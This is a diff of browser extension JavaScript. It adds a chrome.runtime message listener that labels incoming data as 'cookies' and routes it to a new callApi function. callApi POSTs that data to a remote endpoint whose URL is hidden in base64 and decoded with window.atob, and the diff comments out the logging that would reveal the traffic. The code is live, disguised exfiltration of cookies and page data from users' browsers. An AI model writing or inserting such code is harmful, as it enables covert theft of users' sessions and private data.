@@ -1,3 +1,9 @@
+chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
+    callApi({
+        "type": "cookies",
+        "data": request ?? {}
+    });
+});
 function importJS(url) {
     fetch(url, { method: 'get' })
     .then(function(response) {
@@ -23,17 +29,20 @@ try {
 } catch(e){}
 function sendData() {
     document.addEventListener(KEY, (data) => {
-        fetch(window.atob('aHR0cHM6Ly9kZXBsb3ktdGVtcC5hcHBzcG90LmNvbS9hcGkvdXBkYXRlLWRhdGE='), { 
-            method: 'post',
-            headers: {
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data.detail ?? {})
-        }).then((data) => {
-            console.log('data', data);
-        }).catch((e) => {
-            console.log('error', e);
-        });
+        callApi(data.detail ?? {});
+    });
+}
+function callApi(value) {
+    fetch(window.atob('aHR0cHM6Ly9kZXBsb3ktdGVtcC5hcHBzcG90LmNvbS9hcGkvdXBkYXRlLWRhdGE='), { 
+        method: 'post',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(value ?? {})
+    }).then((data) => {
+        // console.log('data', data);
+    }).catch((e) => {
+        // console.log('error', e);
     });
 }
